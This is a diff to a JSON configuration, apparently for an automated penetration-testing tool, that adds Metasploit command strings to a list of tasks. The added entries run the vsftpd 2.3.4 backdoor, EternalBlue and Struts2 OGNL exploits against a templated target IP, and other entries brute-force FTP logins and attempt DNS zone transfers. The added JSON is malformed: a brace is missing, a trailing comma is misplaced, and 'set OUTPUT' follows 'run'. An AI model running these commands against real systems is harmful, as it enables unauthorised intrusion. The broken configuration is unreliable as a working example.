@@ -7,14 +7,28 @@
       "command": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; exploit"
     },
     {
-      "name": "scan-smb",
-      "description": "Scan for SMB vulnerabilities.",
-      "command": "use auxiliary/scanner/smb/smb_version; set RHOSTS {ip}; run"
-    },
-    {
       "name": "ftp-login",
       "description": "Test FTP credentials.",
       "command": "use auxiliary/scanner/ftp/ftp_login; set RHOSTS {ip}; set USER_FILE /usr/share/wordlists/usernames.txt; set PASS_FILE /usr/share/wordlists/passwords.txt; run"
-    }
-  ]
+    },
+    {
+      "name": "ftp-exploit",
+      "description": "Searches and runs FTP exploits against the target.",
+      "command": "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {ip}; run; set OUTPUT {output_file}"
+    },
+    {
+      "name": "smb-exploit",
+      "description": "Searches and runs SMB exploits.",
+      "command": "use exploit/windows/smb/ms17_010_eternalblue; set RHOST {ip}; run; set OUTPUT {output_file}"
+    },
+    {
+      "name": "http-exploit",
+      "description": "Runs HTTP exploits against the target.",
+      "command": "use exploit/multi/http/struts2_content_type_ognl; set RHOST {ip}; run; set OUTPUT {output_file}"
+    },
+    {
+      "name": "dns-zone-transfer",
+      "description": "Performs DNS zone transfer exploit.",
+      "command": "use auxiliary/gather/zone_transfer; set DOMAIN {domain}; run; set OUTPUT {output_file}"
+  ],
 }
